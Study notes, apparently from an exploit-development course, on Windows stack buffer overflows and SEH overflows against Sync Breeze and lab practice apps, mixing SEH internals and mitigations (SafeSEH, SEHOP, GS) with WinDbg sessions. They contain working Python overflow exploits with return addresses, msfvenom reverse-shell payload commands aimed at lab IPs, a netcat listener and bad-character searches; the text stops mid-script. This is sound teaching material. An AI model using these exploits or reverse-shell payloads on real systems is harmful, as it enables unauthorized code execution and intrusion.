
The decoder starts exactly at the address pointed to by the ESP register.

=> The GetPC routine execution ends up changing a few bytes of the decoder itself, and potentially the encoded shellcode. 

=> Cause the decoding process to fail and crash the target process.

To avoid this issue, 2 ways:

- Adjust ESP backwards, making use of assembly instructions such as `DEC ESP`, `SUB ESP, 0xXX` before executing the decoder.

- Precede our payload with a series of No Operation (`NOP`) instructions, which have an opcode value of `0x90` aka **NOP sled** or **NOP slide**, will let the CPU "slide" through the NOPs until the payload is reached.

By the time the execution reaches the shellcode decoder, the stack pointer is far enough away not to corrupt the shellcode when the GetPC routine overwrites a few bytes on the stack.

```bash
sudo nc -lvp 443
```

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  nops = b"\x90" * 10
  shellcode= b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff..."
  shellcode+= b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode))
  inputBuffer = filler + eip + offset + nops + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

## Improving the Exploit

The default `exit` method of a Metasploit shellcode is the **ExitProcess** API - will shut down the whole web service process when the reverse shell is terminated, effectively killing the Sync Breeze service and causing it to crash.

If the program we are exploiting is a **threaded application**, use the **ExitThread** API to only terminate the affected thread of the program.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Replace regex `"\n"` with blank in VS Code

## Extra Mile

### VulnApp1

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 7001
  size = 800

  filler = b"A" * 2288
  eip = b"\xcf\x10\x80\x14" # 148010cf
  offset = b"C" * 8
  nops = b"\x90" * 10
  # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.156 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00"
  shellcode = b"\xbb\x49\x96\xa8\xee\xd9\xec\xd9\x74\..."
  # shellcode+= b"D" * (2560 - len(filler) - len(eip) - len(offset) - len(nops) - len(shellcode))
    
  print("Sending evil buffer...")
  
  buffer = filler + eip + offset + nops + shellcode

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except:
  print("Could not connect!")
```

### VulnApp2

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 7002

  nops = b"\x90" * 10
  # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.156 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x3b\x45"
  shellcode = b"\xbb\xda\xe4\xc8\x5b\xda\xdc\xd9\x74\x24\xf4\..."
  filler = b"A" * (2080 - len(nops) - len(shellcode))
  eip = b"\x11\x2e\x80\x14" # call ecx - 14802e11
  jumpcode = b"C" * 12
  buffer = nops + shellcode + filler + eip + jumpcode
    
  print("Sending evil buffer...")
  
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except:
  print("Could not connect!")
```

# Exploiting SEH Overflows

`python3 seh_overflow_0x01.py 192.168.120.10`

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * size

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

The `EAX` register was overwritten by our "A" buffer. Attempting to execute the `call dword ptr [eax+24h]` instruction triggers an access violation.

The debugger intercepted a 1st chance exception, which is a notification that an unexpected event occurred during the program's normal execution.

Let the application go with `g`, we gained control over the instruction pointer (`eip=41414141`)

## Structured Exception Handling

**Exceptions** are unexpected events that occur during normal program execution.

2 kinds of exceptions:

- **Hardware** exceptions are initiated by the CPU. E.g. When our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address.

- **Software** exceptions are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. E.g., A software developer might want to raise an exception in their code to signal that a function could not execute normally because of an invalid input argument.

Define an exception construct through a `_try/_except` code block.

When compiled, the `_try/_except` code will leverage the Structure Exception Handling (SEH) mechanism implemented by the Windows OS to handle unexpected events.

When a thread faults, the OS calls a designated set of functions (aka **exception handlers**), which can correct, or provide more information about, the unexpected condition.

The exception handlers are **user-defined** and are created during the compilation of the `_except` code blocks.

The **default exception handler** is a special case in that it is **defined by the OS** itself.

The OS must be able to locate the correct exception handler when an unexpected event is encountered.

Structured exception handling works on a **per-thread level**.

Each thread in a program can be identified by the **Thread Environmental Block (TEB)** structure.

Every time a try block is encountered during the execution of a function in a thread, a pointer to the corresponding exception handler is saved on the stack within the `_EXCEPTION_REGISTRATION_RECORD` structure.

Since there may be several try blocks executed in a function, these structures are connected together in a **linked list**.

![SEH Mechanism in action](Images\SEH_mechanism.png)
 
When an exception occurs, the OS inspects the TEB structure of the faulting thread and retrieves a pointer (`ExceptionList`) to the linked list of `_EXCEPTION_REGISTRATION_RECORD` structures through the FS CPU register.

The CPU can access the TEB structure at any given time using the FS segment register at offset zero (`fs:[0]`) on the x86 architecture.

After retrieving the `ExceptionList`, the OS will begin to walk it and invoke every exception handler function until one is able to deal with the unexpected event.

If none of the user-defined functions can handle the exception, the OS invokes the **default exception handler**, which is always the **last node in the linked list**.

This is a special exception handler that terminates the current process or thread in case the application is a **system service**.

### Key Exception Handling Structures

Dump the TEB structure:

`dt nt!_TEB`

The `nt!_TEB` structure starts with a nested structure called `_NT_TIB`.

Dumping `_NT_TIB` shows the 1st member in this structure is a pointer named `ExceptionList`, which points to the first `_EXCEPTION_REGISTRATION_RECORD` structure.

`dt _NT_TIB`

The `_EXCEPTION_REGISTRATION_RECORD` structure contains 2 members:

- `Next`, which points to a `_EXCEPTION_REGISTRATION_RECORD` structure

- `Handler`, which points to an `_EXCEPTION_DISPOSITION` structure.

`dt _EXCEPTION_REGISTRATION_RECORD`

The `Next` member acts as a link between `_EXCEPTION_REGISTRATION_RECORD` structures in the singly-linked list of registered exception handlers.

The `Handler` member is a pointer to the exception callback function named `_except_handler`, which returns an `_EXCEPTION_DISPOSITION` structure on Windows 10 x86.

The `_except_handler` function prototype:

```C
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,  
    IN OUT PCONTEXT ContextRecord,  
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
); 
```

Inside a debugger, the function can have different name variations, such as `ntdll!_except_handler4`. These naming differences are introduced by the symbols provided by Microsoft for each version of Windows.

- `EstablisherFrame` points to the `_EXCEPTION_REGISTRATION_RECORD` structure, which is used to handle the exception.

- `ContextRecord` is a pointer to a `CONTEXT` structure, which contains processor-specific register data at the time the exception was raised.

Dump the `CONTEXT` structure

`dt ntdll!_CONTEXT`

This structure stores the state of all our registers, including the instruction pointer (EIP). => used to **restore the execution flow after handling the exception**.

`_EXCEPTION_DISPOSITION` structure contains the result of the exception handling process.

`dt _EXCEPTION_DISPOSITION`

- If the exception handler invoked by the OS is not valid for dealing with a specific exception, it will return `ExceptionContinueSearch`. This result instructs the OS to move on to the next `_EXCEPTION_REGISTRATION_RECORD` structure in the linked list.

- If the function handler can successfully handle the exception, it will return `ExceptionContinueExecution`, which instructs the system to resume execution.

How the OS calls the exception handler functions and what checks are performed before invoking them.

### SEH Validation

When an exception is encountered, `ntdll!KiUserExceptionDispatcher` is called. This function is responsible for dispatching exceptions on Windows OS.

The function takes 2 arguments.

1. An `_EXCEPTION_RECORD` structure that contains information about the exception.

2. A `CONTEXT` structure.

Eventually, this function calls into `RtlDispatchException`, which will retrieve the **TEB** and proceed to parse the `ExceptionList` through the mechanism explained.

During this process, for each `Handler` member in the singly-linked `ExceptionList` list, the OS will ensure that the `_EXCEPTION_REGISTRATION_RECORD` structure falls within the **stack memory limits** found in the TEB.

During the execution of `RtlDispatchException`, the OS performs additional checks by invoking the `RtlIsValidHandler` function for every exception handler.

`RtlIsValidHandler` is responsible for the **SafeSEH** implementation - a mitigation to prevent an attacker from gaining control of the execution flow after overwriting a stack-based exception handler.

If a module is compiled with the **SafeSEH** flag, the linker will produce an image containing a table of safe exception handlers.

A **linker** is a computer program that combines object files generated by a compiler or assembler into a single executable or library file. It can even combine object files into another object file.

The OS will then validate the exception_handler on the stack by comparing it to the entries in the table of safe exception handlers. If the handler is not found, the system will refuse to execute it.

Pseudo-code for the `RtlIsValidHandler` function

```C
BOOL RtlIsValidHandler(Handler) // NT 6.3.9600
  {
        if (/* Handler within the image */) {
            if (DllCharacteristics->IMAGE_DLLCHARACTERISTICS_NO_SEH)
                goto InvalidHandler;
            if (/* The image is .Net assembly, 'ILonly' flag is enabled */)
                goto InvalidHandler;
            if (/* Found 'SafeSEH' table */) {
                if (/* The image is registered in 'LdrpInvertedFunctionTable' (or its cache), or the initialization of the process is not complete */) {
                    if (/* Handler found in 'SafeSEH' table */)
                        return TRUE;
                    else
                        goto InvalidHandler;
                }
            return TRUE;
        } else {
            if (/* 'ExecuteDispatchEnable' and 'ImageDispatchEnable' flags are enabled in 'ExecuteOptions' of the process */)
                return TRUE;
            if (/* Handler is in non-executable area of the memory */) {
                if (ExecuteDispatchEnable) return TRUE;
            }
            else if (ImageDispatchEnable) return TRUE;
        }
        InvalidHandler:
            RtlInvalidHandlerDetected(...);
            return FALSE;
  }
```

The `RtlIsValidHandler` function checks the `DllCharacteristics` of the specific **module** where the exception occurs.

If the module is compiled with **SafeSEH**, the `exception_handler` will be compared to the entries in the table of safe exception handlers before it is executed.

If `RtlIsValidHandler` succeeds with its validation steps, the OS will call the `RtlpExecuteHandlerForException` function. This function is responsible for setting up the appropriate arguments and invoking `ExecuteHandler`. This native API is responsible for calling the `_except_handler` functions registered on the stack.

SafeSEH requires applications to be compiled with the `/SAFESEH` flag Microsoft introduced an additional mitigation named **Structured Exception Handler Overwrite Protection (SEHOP)**.

**SEHOP** works by verifying that the chain of `_EXCEPTION_REGISTRATION_RECORD` structures are valid before invoking them.

Because the `Next` member is overwritten as part of a SEH overflow the chain of `_EXCEPTION_REGISTRATION_RECORD` structures is no longer intact and the SEHOP mitigation will prevent the corrupted `_except_handler` from executing.

SEHOP is disabled by default on Windows client editions and enabled by default on server editions.

Whenever an exception occurs, the OS calls a designated set of functions as part of the SEH mechanism. Within these function calls, the `ExceptionList` single-linked list is gathered from the TEB structure.

Next, the OS parses the singly-linked list of `_EXCEPTION_REGISTRATION_RECORD` structures, performing various checks before calling the `exception_handler` function pointed to by each `Handler` member. This continues until a handler is found that will successfully process the exception and allow execution to continue. If no handler can successfully handle the exception, the application will crash.

## Structured Exception Handler Overflows

A structure exception overflow is a stack buffer overflow that is either large enough or positioned in such a way to overwrite valid registered exception handlers on the stack.

By overwriting one or more of these handlers, the attacker can take control of the instruction pointer after triggering an exception.

In most cases, an overflow tends to overwrite valid pointers and structures on the stack, which often generates an access violation exception.

If this does not occur, an attacker can often force an exception by increasing the size of the overflow.

**SEH Overflows can bypass Stack Cookies**

Stack overflow mitigation named `GS` is enabled by default in modern versions of Visual Studio.

When a binary that is compiled with the `/GS` flag is loaded a **random stack cookie seed** value is initialized and stored in the `.data` section of the binary.

When a **function** protected by GS is called, an **XOR operation** takes place between the stack cookie seed value and the EBP register. The result of this operation is stored on the stack prior to the return address.

Before returning out of the protected function, another XOR operation occurs between the previous value saved on the stack and the EBP register. This result is then checked with the stack cookie seed value from the `.data` section. If the values do not match the application will throw an exception and terminate the execution.

Overwriting an exception handler and causing the application to crash in any way triggers the SEH mechanism and causes the instruction pointer to be redirected to the address of the `exception_handler` prior to reaching the end of the vulnerable function.

=> Overwriting a `_EXCEPTION_REGISTRATION_RECORD` can allow an attacker to **bypass stack cookies**.

The `_EXCEPTION_REGISTRATION_RECORD` structures are stored at the beginning of the stack space.

### Inspect a chain of `_EXCEPTION_REGISTRATION_RECORD` structures

Because the SEH mechanism works on a per-thread basis, we won't be able to inspect the intact SEH chain for the thread handling our incoming data, as that thread has not yet spawned.

Instead, we will inspect the chain of `_EXCEPTION_REGISTRATION_RECORD` structures for the thread WinDbg breaks into when we attach the debugger to the target process.

Obtain the TEB address which will contain the `ExceptionList` pointer:

`!teb`

The `ExceptionList` starts very close to the beginning of the `StackBase`.

Dump the first `_EXCEPTION_REGISTRATION_RECORD` structure at the memory address specified in the `ExceptionList` member.

The `_EXCEPTION_REGISTRATION_RECORD` structure has 2 members:

- `Next` points to the next entry in the singly-linked list.
- `Handler` is the memory address of the `_except_handler` function.

```
dt _EXCEPTION_REGISTRATION_RECORD 0132ff70
dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffcc
dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffe4
```

The end of the singly-linked list is marked by the `0xffffffff` value stored by the last `_EXCEPTION_REGISTRATION_RECORD` `Next` member. This last record is the default exception handler specified by the OS.

### Back to the PoC

Send our previous PoC, once again triggering an access violation:

```bash
python3 seh_overflow_0x01.py 192.168.120.10
```

Attempt to walk the `ExceptionList` => The **second** `_EXCEPTION_REGISTRATION_RECORD` structure has been overwritten by our malicious buffer.

```
!teb
dt _EXCEPTION_REGISTRATION_RECORD 01c4fe1c
dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54
```

### Important Note

`_EXCEPTION_REGISTRATION_RECORD` structures are pushed on the stack from first to last.

=> SEH overflows generally overwrite the last `_EXCEPTION_REGISTRATION_RECORD` structure first.

Depending on the length of the overflow, it is possible to overwrite more than one `_EXCEPTION_REGISTRATION_RECORD` structure.

The exception occurs because the application is trying to read and execute from an unmapped memory page.

=> An **access violation exception** that needs to be handled by either the application or the OS.

List the current thread exception handler chain:

`!exchain`

```
01c4fe1c: libpal!md5_starts+149fb (00b3df5b)
01c4ff54: 41414141
Invalid exception stack at 41414141
```

The 1st step in the SEH mechanism is to obtain the address of the first `_EXCEPTION_REGISTRATION_RECORD` structure from the TEB.

The OS then proceeds to call each `_except_handler` function until the exception is properly handled, or it simply crashes the process if no handler could successfully deal with the exception.

At this point, the address of at least one of the `_except_handler` functions has been overwritten by our buffer (`0x41414141`).

=> Whenever this `_EXCEPTION_REGISTRATION_RECORD` structure is used to handle the exception, the CPU will end up calling `0x41414141`, giving us control over the EIP register.

Resuming execution and letting the application attempt to handle the exception with `g`.

Inspect the **callstack** to determine which functions were called before the EIP register was overwritten

`k`

```
 # ChildEBP RetAddr  
00 01c4f434 77383b02 0x41414141
01 01c4f458 77383ad4 ntdll!ExecuteHandler2+0x26
02 01c4f528 77371586 ntdll!ExecuteHandler+0x24
03 01c4f528 00ac2a9d ntdll!KiUserExceptionDispatcher+0x26
04 01c4fec8 00000000 libpal!SCA_ConfigObj::Deserialize+0x1d
```

`ntdll!ExecuteHandler2` was called directly before we achieved code execution. This function is responsible for calling the `_except_handler` functions registered on the stack.

List all the registers to determine if any of them point to our buffer:

`r`

The ECX register is being overwritten alongside the instruction pointer while most of the other registers are NULL.

`u edx`

EDX appears to point somewhere inside the `ntdll!ExecuteHandler2` function.

=> None of the registers point to our buffer at the moment we gain control over the execution.

`dds esp La`

We do not overwrite any data on the stack (which ESP and EBP point to).

Set a breakpoint at the `ntdll!ExecuteHandler2` function to stop the execution before WinDbg intercepts the exception (after the  1st chance exception)

`bp ntdll!ExecuteHandler2`

When the access violation is triggered, the 1st entry in `ExceptionList` is not overwritten by our buffer.

Our overflow only affects the following `_EXCEPTION_REGISTRATION_RECORD` structure in the linked list.

=> When the SEH mechanism tries to handle the exception, `ntdll!ExecuteHandler2` will be called twice.

Initially, it will use the first `_EXCEPTION_REGISTRATION_RECORD` structure (which is still intact) and then proceed to use the corrupted structure.

When the breakpoint is first triggered, let execution resume twice with `g`.

After hitting our breakpoint the 2nd time, inspect the assembly code of the executing function:

`u @eip L11`

```
ntdll!ExecuteHandler2:
55              push    ebp
8bec            mov     ebp,esp
ff750c          push    dword ptr [ebp+0Ch]
52              push    edx
64ff3500000000  push    dword ptr fs:[0]
64892500000000  mov     dword ptr fs:[0],esp
ff7514          push    dword ptr [ebp+14h]
ff7510          push    dword ptr [ebp+10h]
ff750c          push    dword ptr [ebp+0Ch]
ff7508          push    dword ptr [ebp+8]
8b4d18          mov     ecx,dword ptr [ebp+18h]
ffd1            call    ecx
648b2500000000  mov     esp,dword ptr fs:[0]
648f0500000000  pop     dword ptr fs:[0]
8be5            mov     esp,ebp
5d              pop     ebp
c21400          ret     14h
```

According to the call stack, `call ecx` should call the overwritten `_except_handler` function (`0x41414141`).

This function accepts 4 arguments as inferred from the 4 PUSH instructions preceding the `call ecx`.

This matches the `_except_handler` function prototype:

```C
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,
    IN OUT PCONTEXT ContextRecord, 
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
); 
```

We start by saving the EBP register on the stack and moving the stack pointer to EBP to easily access the arguments passed to the `ntdll!ExecuteHandler2` function (running `t` twice).

`ff750c   push dword ptr [ebp+0Ch]  ss:0023:018ef464=018eff54`

`!teb`

```
TEB at 003c4000
    ExceptionList:        018efe1c
    StackBase:            018f0000
    StackLimit:           018ee000
```

`dt _EXCEPTION_REGISTRATION_RECORD 018efe1c`

```
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next         : 0x018eff54   _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler      : 0x0097df5b   _EXCEPTION_DISPOSITION  libpal!md5_starts+0
```

The first PUSH instruction push the `Next` member of the first `_EXCEPTION_REGISTRATION_RECORD` structure on the stack.

```
t
u @edx
```

```
ntdll!ExecuteHandler2+0x44:
77383b20 8b4c2404        mov     ecx,dword ptr [esp+4]
77383b24 f7410406000000  test    dword ptr [ecx+4],6
77383b2b b801000000      mov     eax,1
77383b30 7512            jne     ntdll!ExecuteHandler2+0x68 (77383b44)
77383b32 8b4c2408        mov     ecx,dword ptr [esp+8]
77383b36 8b542410        mov     edx,dword ptr [esp+10h]
77383b3a 8b4108          mov     eax,dword ptr [ecx+8]
77383b3d 8902            mov     dword ptr [edx],eax
```

`push edx` appears to place an offset into the `ntdll!ExecuteHandler2` function on the stack.

`t`

```
64ff3500000000  push dword ptr fs:[0]  fs:003b:00000000=018efe1c
```

`!teb`

```
TEB at 003c4000
    ExceptionList:        018efe1c
    StackBase:            018f0000
    StackLimit:           018ee000
```

The 3rd PUSH instruction push the current thread `ExceptionList` onto the stack.

`t`

This is followed by a `mov dword ptr fs:[0],esp` instruction, which will overwrite the current thread `ExceptionList` with the value of ESP.

`!teb`

```
TEB at 003c4000
    ExceptionList:        018efe1c
    StackBase:            018f0000
    StackLimit:           018ee000
```

`t`

```
ff7514   push dword ptr [ebp+14h]  ss:0023:018ef46c=018ef4cc
```

`!teb`

```
TEB at 003c4000
    ExceptionList:        018ef44c
    StackBase:            018f0000
    StackLimit:           018ee000
```

`dt _EXCEPTION_REGISTRATION_RECORD 018ef44c`

```
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x018efe1c _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x770a3b20   _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+0
```

Before pushing the parameters required for the `_except_handler` function and calling it, the OS updates `ExceptionList` with a new `_EXCEPTION_REGISTRATION_RECORD` structure.

This new `_EXCEPTION_REGISTRATION_RECORD` is responsible for handling exceptions that might occur during the call to `_except_handler`.

The function used to handle these exceptions is placed in EDX  before the call to `ntdll!ExecuteHandler2`.

The OS leverages various exception handlers depending on the function that is used to invoke the `_except_handler`.

In our case, the handler located at `0x770a3b20` is used to deal with exceptions that might occur during the execution of `RtlpExecuteHandlerForException`.

After the execution of `_except_handler` ("call ecx"), the OS restores the original `ExceptionList` by removing the previously added `_EXCEPTION_REGISTRATION_RECORD`. This is done by executing the two instructions `mov esp,dword ptr fs:[0]` and `pop dword ptr fs:[0]`.

Proceed to single-step the remaining instructions with `t` and stop at `call ecx` to inspect the address we are about to redirect the execution flow to.

### Gaining Code Execution

`r`

```
eax=00000000 ebx=00000000 ecx=41414141 edx=77f16b30 esi=00000000 edi=00000000
eip=77f16b10 esp=013ff33c ebp=013ff358 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2+0x24:
77f16b10 ffd1            call    ecx {41414141}
```

`dds esp L6`

```
013ff33c  013ff440
013ff340  013fff54
013ff344  013ff45c
013ff348  013ff3cc
013ff34c  013ffe1c
013ff350  77f16b30 ntdll!ExecuteHandler2+0x44
```

The moment our fake handler function is called, the stack will contain the return address followed by the four _except_handler arguments.

```c
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
    IN PEXCEPTION_RECORD ExceptionRecord,  
    IN VOID EstablisherFrame,
    IN OUT PCONTEXT ContextRecord, 
    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
);
```

The 2nd argument (EstablisherFrame) is a pointer to the `_EXCEPTION_REGISTRATION_RECORD` structure used to handle the exception.

`dt _EXCEPTION_REGISTRATION_RECORD 013fff54`

```
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
```
   
`dd 013fff54`

```
013fff54  41414141 41414141 41414141 41414141
013fff64  41414141 41414141 41414141 41414141
013fff74  41414141 41414141 41414141 41414141
013fff84  41414141 41414141 41414141 41414141
013fff94  41414141 41414141 41414141 41414141
013fffa4  41414141 41414141 41414141 41414141
013fffb4  41414141 41414141 41414141 41414141
013fffc4  41414141 41414141 41414141 41414141
```

The 2nd argument (`EstablisherFrame`) passed to the handler function points to our controlled data on the stack, i.e. the same buffer that overwrites the `_EXCEPTION_REGISTRATION_RECORD` structure.

=> To redirect the execution flow to our buffer, we could overwrite the exception handler with the address of an instruction that returns into the `EstablisherFrame` address on the stack.

The most common sequence of instructions used in SEH overflows is `POP R32, POP R32, RET`.

In which we `POP` the **return address** and the `ExceptionRecord` argument from the stack into 2 arbitrary registers (R32) and then execute a `RET` operation to return into the `EstablisherFrame`.

Before searching for a `POP, POP, RET` (P/P/R) instruction sequence,determine the exact offset required to precisely overwrite the exception handler on the stack.

Generate a unique pattern with a length of 1000 bytes. This matches the input buffer size from our initial PoC that triggered the crash


```bash
msf-pattern_create -l 1000
```

```python
...
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8...Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
...
```


`!exchain`

```
0155fe1c: libpal!md5_starts+149fb (005fdf5b)
0155ff54: 33654132
Invalid exception stack at 65413165
```


```bash
msf-pattern_offset -l 1000 -q 33654132
```

```
[*] Exact match at offset 128
```


```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```

`!exchain`

```
013afe1c: libpal!md5_starts+149fb (005fdf5b)
013aff54: 42424242
Invalid exception stack at 41414141
```

### Detecting Bad Characters

```python
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= badchars
  inputBuffer+= b"\x43" * (size - len(inputBuffer))
```

`dds esp L5`

```
0132f338  77f16b12 ntdll!ExecuteHandler2+0x26
0132f33c  0132f440
0132f340  0132ff54
0132f344  0132f45c
0132f348  0132f3cc
```

`db 0132ff54`

```
0132ff54  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 5b 00
0132ff64  10 3e 5b 00 28 73 a0 00-72 40 5b 00 58 cf 9f 00
```

Our buffer was truncated right after the 0x01 character => `0x02` is a bad character for our exploit.

After repeating this process several times we locate all the bad characters: `0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD`

### Finding a P/P/R Instruction Sequence

WinDbg narly extension generates a list of all loaded modules and their respective protections. The extension is already installed on our dedicated Windows client.

`.load narly`

Executing `!nmod` outputs a list of all loaded modules and their memory protections

`!nmod`

```
00400000 00463000 syncbrs              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
10000000 10226000 libspp               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
6cc70000 6cd09000 ODBC32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ODBC32.dll
...
*DEP/*ASLR means that these modules are compatible with ASLR/DEP
```

`/SafeSEH OFF` indicates that this application and its modules are compiled without SafeSEH. Since DEP and ASLR are not displayed, they are also disabled.

The most common way to bypass the SafeSEH protection is to leverage the `POP R32, POP R32, RET` instruction sequence from a module that was compiled without the `/SAFESEH` flag.

To make our exploit as reliable and portable4 as possible against multiple Windows OS, try to find a `POP R32, POP R32, RET` instruction sequence located inside a module that is part of the vulnerable software.

This ensures that it will be present on every installation of the software (regardless of Windows version).

The `libspp.dll` application DLL is a perfect candidate. It is compiled without any protections and is loaded in a memory range which does not contain null bytes.

Write a small script to search for a `P/P/R` instruction sequence.

2 common approaches to writing WinDbg scripts:

1. classic scripts: are normal WinDbg commands wrapped with a few control flow commands. They use pseudo-registers and don't have variables.

2. `pykd`, a powerful WinDbg Python wrapper

The new version of **WinDbg Preview** comes with a built-in JavaScript scripting engine (not be covered in this course).

Determine the specific opcodes and the address range we'll search.

We could also leverage `mona.py` for this but as of this writing, it does not work with Python 3, which is provided on the dedicated Windows client.

Since we are going to search through `libspp.dll`, retrieve the start and end memory addresses with WinDbg:

`lm m libspp`

```
Browse full module list
start    end        module name
10000000 10226000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
```

```bash
msf-nasm_shell
nasm > pop eax
nasm > pop ebx
nasm > pop ecx
nasm > pop edx
nasm > pop esi
nasm > pop edi
nasm > pop ebp
nasm > ret
```

`$><C:\Users\offsec\Desktop\find_ppr.wds`

```
.block
{
